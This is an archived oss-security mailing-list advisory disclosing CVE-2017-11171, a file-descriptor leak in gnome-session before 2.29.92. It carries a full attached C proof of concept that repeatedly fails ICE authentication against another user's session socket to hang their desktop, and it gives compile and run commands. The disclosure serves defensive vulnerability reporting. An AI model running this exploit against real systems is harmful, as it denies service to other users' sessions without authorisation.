X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6355" "Wednesday" "12" "July" "2017" "10:43:50" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20170712084350.GA15676@f195.suse.de>" "238" "[oss-security] CVE-2017-11171: gnome-session: Bad reference counting in the context of accept_ice_connection() in gsm-xsmp-server.c" nil nil nil "7" "2017071208:43:50" "[oss-security] CVE-2017-11171: gnome-session: Bad reference counting in the context of accept_ice_connection() in gsm-xsmp-server.c" (number mark "U       mgerstner@su Jul 12  238/6355  " thread-indent "\"[oss-security] CVE-2017-11171: gnome-session: Bad reference counting in the context of accept_ice_connection() in gsm-xsmp-server.c\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 23668 invoked by uid 550); 12 Jul 2017 09:14:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11326 invoked from network); 12 Jul 2017 08:44:02 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Wed, 12 Jul 2017 10:43:50 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20170712084350.GA15676@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="1ccMZA6j1vT5UqiK"
Content-Disposition: inline
User-Agent: Mutt/1.5.24 (2015-08-30)
Subject: [oss-security] CVE-2017-11171: gnome-session: Bad reference counting in the context
 of accept_ice_connection() in gsm-xsmp-server.c

--1ccMZA6j1vT5UqiK
Content-Type: multipart/mixed; boundary="dc+cDN39EJAMEtIO"
Content-Disposition: inline


--dc+cDN39EJAMEtIO
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Affected package: gnome-session
Affected versions: < 2.29.92

Bad reference counting in the context of accept_ice_connection() in
gsm-xsmp-server.c in old versions of gnome-session up until version
2.29.92 allows a local attacker to establish ICE connections to
gnome-session with invalid authentication data (an invalid magic
cookie). Each failed authentication attempt will leak a file descriptor
in gnome-session.

When the maximum number of file descriptors is exhausted in the
gnome-session process, it will enter an infinite loop trying to
communicate without success, consuming 100% of the CPU. The graphical
session associated with the gnome-session process will stop working
correctly, because communication with gnome-session is no longer
possible.

This was fixed with the following commit:

https://github.com/GNOME/gnome-session/commit/b0dc999e0b45355314616321dbb6c=
b71e729fc9d

The problem seems to be that upon connection establishment
gms_store_add() is called, but not gsm_store_remove(), even if the
authentication of the ICE connection fails.

You can find a proof of concept program attached.

References:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2017-11171
https://bugzilla.suse.com/show_bug.cgi?id=3D1048274

Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290

SUSE Linux GmbH=20
GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

--dc+cDN39EJAMEtIO
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="ice_dos.c"

/*
 2017 - SUSE Linux GmbH, Matthias Gerstner

 based on the PoC for CVE-2017-2626 from:

	 2017 - X41 D-Sec GmbH, Eric Sesterhenn

	 Not for commercial usage.

	 Author: Eric Sesterhenn <eric.sesterhenn@x41-dsec.de>

	 PoC DoS against a file descriptor / memory leak in gnome-session

 Author: Matthias Gerstner <mgerstner@suse.com>

 gnome-session until version 2.29.92 contained a file descriptor leak upon
 failed ICE connection authentications. It was fixed as a side effect of this
 commit in version 2.29.92:

 https://github.com/GNOME/gnome-session/commit/b0dc999e0b45355314616321dbb6cb71e729fc9d

 When the leak is present then the DoS is easily and quickly performed. Once
 all 1024 file descriptors are spent, the gnome-session process runs at 100 %
 CPU load trying to continue communication, but no more file descriptors can
 be opened. This breaks any further communication with gnome-session and thus
 the gnome desktop session becomes partly unusable.

 This worked for me on SUSE Enterprise Linux 11 SP4. You need to have some
 local user logged in in gdm. This PoC can be run by any other user.

 Compile like this:

 gcc -oice_dos ice_dos.c -g -O2 -lICE

 Run like this:

 ./ice_dos /tmp/.ICE-unix/1234

 You need to select the UNIX socket that is matching your logged in user's
 gnome session for the PoC to work.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <X11/ICE/ICElib.h>
#include <X11/ICE/ICEmsg.h>
#include <X11/ICE/ICEproto.h>
#include <X11/ICE/ICEutil.h>
#include <stdio.h>

int main(int argc, char **argv) {
	IceConn iceConn;
	char *ids = NULL;
	char *hostname = malloc(HOST_NAME_MAX);
	int PMopcode;
	const int error_length = 100;
	char *error_string = malloc(error_length);
	int _SmcOpcode = 1;
	const char *file = argv[1];
	char authdata[16];
	int i;
	FILE *authFile;
	IceAuthFileEntry auth;

	if (!error_string)
	{
		perror("no memory");
		return 2;
	}

	IcePoVersionRec versions[] = {
		{1, 0, NULL}
	};
	int version_count = 1;
	char *auth_names[] = {"MIT-MAGIC-COOKIE-1"};
	IcePoAuthProc auth_procs[] = {NULL};
	int auth_count = 1;

	if( argc != 2 )
	{
		printf("Expected path to /tmp/.ICE-unix/<socket>\n");
		return 1;
	}

	PMopcode = IceRegisterForProtocolSetup(
		"XSMP",
		"gnome-session", "3.14.0",
		version_count, versions,
		auth_count, auth_names, auth_procs, NULL
	);

	if (PMopcode < 0) {
		exit(PMopcode);
	}

	if( gethostname(hostname, HOST_NAME_MAX) != 0 )
	{
		perror("couldn't get hostname");
		return 1;
	}

	asprintf(&ids, "local/%s:@%s", hostname, file);
	if (!ids){ perror("no memory"); }

	printf("Trying connection %s\n", ids);

	/*
	 * simply authenticate unsuccessfully more than 1024 times to cause
	 * DoS of gnome-session.
	 */

	auth.protocol_name = "ICE";
	auth.protocol_data = 0;
	auth.protocol_data_length = 0;
	auth.network_id = ids;
	auth.auth_name = "MIT-MAGIC-COOKIE-1";
	auth.auth_data = authdata;
	auth.auth_data_length = 16;
	authFile = fopen(IceAuthFileName(), "w+");
	if (!IceWriteAuthFileEntry(authFile, &auth))
	{
		exit(-1);
	}
	fclose(authFile);

	for (i = 0; i < 1025; i++)
	{
		iceConn = IceOpenConnection(
			ids, NULL, 0, _SmcOpcode, error_length, error_string
		);

		if (iceConn) {
			printf("Connection opened unexpectedly\n");
			return 0;
		}
		else
		{
			printf("%d: Failed: %s\n", i, error_string);
		}
	}

	free(error_string);
	free(hostname);
	printf("Failed to DoS\n");
	return 3;
}

--dc+cDN39EJAMEtIO--

--1ccMZA6j1vT5UqiK
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBAgAGBQJZZeFGAAoJEBTEBclxkjVTF9gQAJ9PNrzWYBXaJaSE+BGVlO0Q
9u5TTg8VIqTt4OWhNfLpF/XnuOC7M2iFPhngar1VfNmopwi6++I6N2sjUWyvLvKn
dZXJSI1rgcpAllYzmb60sLx70H7kFFMBXiDKHDhRc/4wclPEpyIDFTijFDamEG2w
SD1sI1PvHPuDCzB4ez+WsCw5/sDj1hiDqcJx+fzehqDuNS+Mjy2ZyLsCFUu08zeV
F/KQslLUoRQ599EUPHYloyJN6zl6wMhGGzxxpgUUImO69KhmDEsTxItjvbItaMFH
Mpzl0C+b7vUR7EFP/H39ZjBYE/Kv4OEHYVN5EGeICe+/qr3Em3Zi2wwfEDUMSocK
JiEZQa8fjSTMP1/TVa4iWI09ng8N1XWTNowJGFHDRnZazSkXEPtqJl224mBGtzKI
1EDFegfL9WqG5ye9lVyMQsKH/cTgFW2gZz36gWu72xvpU30E7U/58O5mBRw8sbOT
wrxZIV0vd9N/5JoAruQIb10JKP0SxDaok849HUpKJz0L0zktXSTSkt7te/nTWzcE
JGx+xk1v/ECa48v76ZX9Zm3h7qzhSAyo03dMPuTQNiNZ3MG4HAXJSR6GOmakIn/r
rvimq2RQPn+GzLySxaOW2tEhIZl3YMlrWc3YM3LOJw1gWHQUg8r2KJS612HMOG8k
LcBgOAr5fMqzKzU8HcVf
=5ebD
-----END PGP SIGNATURE-----

--1ccMZA6j1vT5UqiK--
